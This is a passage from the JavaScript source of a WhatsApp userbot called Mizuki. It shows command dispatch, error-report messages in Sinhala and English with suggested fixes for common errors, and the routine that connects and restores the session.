                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'SI' || config.LANG == 'EN') {
                                await conn.sendMessage(conn.user.jid, '*-- දෝෂ වාර්තාව [👸 Mizuki] --*' +
                                    '\n*Mizuki bot හි දෝෂයක් සිදු වී ඇත!*'+
                                    '\n_මෙම දෝශ සටහනෙහි ඔබේ අංකය හෝ SUDO අංකයක් ඇතුළත් විය හැකිය. කරුණාකර එය සමග සැලකිලිමත් වන්න!_' +
                                    '\n_උදව් සඳහා ඔබට අපගේ වට්ස්ඇප් සමූහයට පණිවුඩ දැමිය හැකිය._' +
                                    '\n_මෙම පණිවිඩය ඔබගේ log අංකයට යා යුතුව තිබුණි (සුරැකි පණිවිඩ)._' +
                                    '\n_ඔබට මෙම සමූහයට :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo දෝෂය වාර්තා කළ හැකිය._\n\n' +
                                    '*සිදුවුණු දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️  දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _සහය දක්වන්නේ සත්‍ය URL වලට පමණි._' +
                                        '\n*හේතුව(පැහැදිලිව):* _Log අංකය තුළ මාධ්‍ය මෙවලම් (xmedia, sticker ..) භාවිතය._' +
                                        '\n*විසඳුම:* _විධානය Log අංකය හැර වෙනත් ඕනෑම කතාබහක භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _SQL Database Error_' +
                                        '\n*හේතුව(පැහැදිලිව):* _Database\'in bozulması._ ' +
                                        '\n*විසඳුම:* _දන්නා විසඳුමක් නැත.ඔබට නැවත ස්ථාපනය කිරීම උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Split of Undefined_' +
                                        '\n*හේතුව(පැහැදිලිව):* _කණ්ඩායම් පරිපාලකයින්ට භාවිතා කළ හැකි විධානයන් වරින් වර බෙදීමේ ක්‍රියාවලිය නොදකියි._ ' +
                                        '\n*විසඳුම:* _රීස්ටාර්ට් කිරීමෙන් මෙය විසඳා ගත හැක._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Ookla Server Connection_' +
                                        '\n*හේතුව(පැහැදිලිව):* _Speedtest එකට දත්ත සම්ප්‍රේෂණය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ඔබ එම විධානය නැවත වරක් භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Requested Audio Params_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ලතින් නොවන අක්ෂර වලින් ටීටීඑස් විධානය භාවිතා කරන්න._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් අකුරින් විධානය භාවිතා කළහොත් ගැටළුව විසඳෙනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව* _එවැනි ගොනුවක් හෝ ඩිරෙක්ටරියක් නැත_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ලගිනය වැරදි ලෙස කෝඩ් කර ඇත._' +
                                        '\n*විසඳුම:* _කරුණාකර ප්ලගිනයේ කේත පරීක්ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Error 404 HTTPS_' +
                                        '\n*හේතුව(පැහැදිලිව):* _හෙරෝකු ප්ලගිනය යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවියේ මෙහෙයුම සිදු කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Reply Delete Function_' +
                                        '\n*හේතුව(පැහැදිලිව):* _img හෝ wiki විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු දෝෂයක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Reply Delete Function_' +
                                        '\n*හේතුව(පැහැදිලිව):* _img හෝ wiki විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු දෝෂයක් නොවේ.__'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Bailyes Action Error_ ' +
                                        '\n*හේතුව(පැහැදිලිව)* _නිශ්චිත හේතුව නොදනී. විකල්ප කිහිපයක්ම මෙම දෝෂය ඇති කිරීමට හේතු වන්නට ඇත._' +
                                        '\n*විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කළහොත් එය නිවැරදි කළ හැකිය. දෝෂය පවතින්නේ නම්, ඔබට නැවත ආරම්භ කිරීම උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Cannot Decode Text or Media_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ලගිනය වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ප්ලගිනය විස්තරයේ ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!`` ==========' +
                                        '\n\n*හේතුව:* _Word Character Usage_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ඉංග්‍රීසි හෝ ලතින් හෝඩියෙන් පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඉංග්‍රීසි භාෂාව හෝ ලතින් භාෂාව භාවිත කරන්න.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Deleting Plugin_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ල්ගීනයක් ඉවත් කිරීමේදී නම වැරදි ලෙස ඇතුළත් කිරීම._' +
                                        '\n*විසඳුම:* _ඔබට මැකීමට අවශ්‍ය ප්ලගිනයට _ * __ * _ එකතු නොකර කරුණාකර උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, නම අවසානයේ ""? (.*) / $ "" වැනි සම්පූර්ණ ප්‍රකාශන පුරවන්න._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 කණගාටුයි මට මෙම දෝෂය කියවීමට නොහැකි වුනා!! 🙇🏻*' +
                                        '\n_වැඩිදුර උදව් සඳහා ඔබට අපගේ Support group :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo එකට පැමිණිය හැකිය._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [MIZUKI] --*' +
                                    '\n* An error has occurred!*'+
                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_You can write to our Telegram group for help._' +
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our Support group :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

mizuki();
